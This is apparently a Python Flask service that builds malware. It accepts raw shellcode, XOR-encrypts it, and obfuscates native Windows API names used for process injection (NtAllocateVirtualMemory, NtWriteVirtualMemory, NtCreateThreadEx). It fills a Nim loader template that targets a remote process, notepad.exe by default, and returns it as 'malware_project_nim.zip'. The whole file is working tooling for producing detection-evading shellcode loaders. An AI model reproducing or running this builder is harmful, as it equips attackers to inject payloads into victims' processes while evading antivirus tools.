#!/usr/bin/env python3
import io
import os
import re
import subprocess
import zipfile
import shutil
from dataclasses import dataclass
from secrets import token_hex
from pathlib import Path
from typing import List, Optional
from flask import Flask, jsonify, request, send_file, send_from_directory, render_template
import textwrap

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

VALID_METHODS = {"A", "B"}
VALID_OUTPUTS = {"EXE", "DLL"}
VALID_TECHNIQUES = {"A", "B", "C", "D"}

@dataclass(frozen=True)
class GenerateRequest:
    message: str
    method: str
    output: str
    technique: str
    function_names: List[str]
    target_process: str

def validate_payload(payload: dict) -> GenerateRequest:
    message = str(payload.get("message", "")).strip()
    method = str(payload.get("method", "")).strip().upper()
    output = str(payload.get("output", "")).strip().upper()
    technique = str(payload.get("technique", "")).strip().upper()
    fn_raw = payload.get("function_names", "")
    target_raw = str(payload.get("target_process", "")).strip()

    if method not in VALID_METHODS: method = "B"
    if output not in VALID_OUTPUTS: output = "EXE"
    if technique not in VALID_TECHNIQUES: technique = "A"

    parts = re.split(r"[,\\s]+", str(fn_raw) if fn_raw else "")
    function_names = [re.sub(r"[^a-zA-Z0-9_]", "_", p) for p in parts if p]
    
    target_process = re.sub(r"[^a-zA-Z0-9_\\.-]", "", target_raw)
    if not target_process: target_process = "notepad.exe"
    
    return GenerateRequest(message, method, output, technique, function_names, target_process)

def generate_nim_source(req: GenerateRequest) -> str:
    # shellcode & encryption
    clean_hex = re.sub(r'[^0-9a-fA-F]', '', req.message)
    if not clean_hex: clean_hex = "909090"
    
    # hex to bytes
    shellcode = bytearray.fromhex(clean_hex)
    
    # random xor key
    key_bytes = [int(b) for b in token_hex(8).encode()]
    shellcode_encrypted = bytearray(shellcode)
    
    for i in range(len(shellcode_encrypted)):
        shellcode_encrypted[i] ^= key_bytes[i % len(key_bytes)]
    
    # format nim array
    payload_nim = ", ".join(f"0x{b:02x}'u8" for b in shellcode_encrypted)
    key_nim = ", ".join(f"0x{b:02x}'u8" for b in key_bytes)

    is_dll = (req.output == "DLL")
    is_remote = (req.method == "A")
    target_process = req.target_process

    # 3. xor string obfuscation
    def xor_string(s: str) -> str:
        key = token_hex(1)
        k_int = int(key, 16)
        encrypted_bytes = []
        for char in s:
            encrypted_bytes.append(ord(char) ^ k_int)
        
        payload_str = ", ".join(f"0x{b:02x}'u8" for b in encrypted_bytes)
        return f"(0x{k_int:02x}'u8, [{payload_str}])"

    # xor string list
    s_ntdll = xor_string("ntdll.dll")
    s_kernel32 = xor_string("kernel32.dll")
    s_NtAlloc = xor_string("NtAllocateVirtualMemory")
    s_NtProtect = xor_string("NtProtectVirtualMemory")
    s_NtWrite = xor_string("NtWriteVirtualMemory")
    s_NtOpenProc = xor_string("NtOpenProcess")
    s_NtCreateThread = xor_string("NtCreateThreadEx")

    nim_code = render_template(
        "loader.nim",
        is_remote=is_remote,
        target_process=target_process,
        shellcode_len=len(shellcode_encrypted),
        payload_nim=payload_nim,
        key_len=len(key_bytes),
        key_nim=key_nim,
        is_dll=is_dll,
        function_names=req.function_names,
        technique=req.technique,
        s_ntdll=s_ntdll,
        s_kernel32=s_kernel32,
        s_NtAlloc=s_NtAlloc,
        s_NtProtect=s_NtProtect,
        s_NtWrite=s_NtWrite,
        s_NtOpenProc=s_NtOpenProc,
        s_NtCreateThread=s_NtCreateThread
    )

    return nim_code

@app.route("/api/generate", methods=["POST"])
def api_generate():
    try:
        data = request.get_json(force=True)
        req = validate_payload(data)
        
        build_id = token_hex(4)
        build_dir = Path(BASE_DIR) / "builds" / build_id
        build_dir.mkdir(parents=True, exist_ok=True)
        
        # generate nim
        nim_code = generate_nim_source(req)
        src_file = build_dir / "loader.nim"
        with open(src_file, "w") as f:
            f.write(nim_code)
            
        # zip
        mem = io.BytesIO()
        with zipfile.ZipFile(mem, "w") as z:
            z.write(src_file, arcname="loader.nim")
            
            readme = textwrap.dedent('''
            Made by Nikola Milovanovic
            ''')
            z.writestr("README.txt", readme)
                
        mem.seek(0)
        return send_file(mem, mimetype="application/zip", as_attachment=True, download_name="malware_project_nim.zip")

    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)